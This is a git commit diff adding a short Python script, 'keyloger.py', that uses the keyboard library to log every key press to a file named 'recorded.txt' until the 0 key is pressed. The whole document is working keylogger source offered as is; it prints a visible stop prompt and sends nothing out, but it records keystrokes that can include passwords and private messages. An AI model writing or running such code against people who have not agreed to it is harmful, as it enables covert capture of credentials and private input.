30d1443d80ec84288049aaa195a76fe93e252cfa
pachecojromar-glitch <pachecojromar@gmail.com>
2026-02-22 14:52:40 -0500

    Add keylogger to record key presses to a file
    Implement keylogger functionality to record key presses.

--- keyloger.py
+++ keyloger.py
@@ -1,1 +1,20 @@
+import keyboard
 
+print("Press 0 to stop")
+
+with open("recorded.txt", "a") as file:
+
+    def key_pressed(key):
+        if key.name == 'space':
+            file.write(' ')
+        elif key.name == '@':
+            file.write('@')
+        elif key.name == 'enter':
+            file.write('\n')
+        else:
+            file.write(key.name)
+
+    keyboard.on_press(key_pressed)
+    keyboard.wait('0')
+
+print("Recording finished")
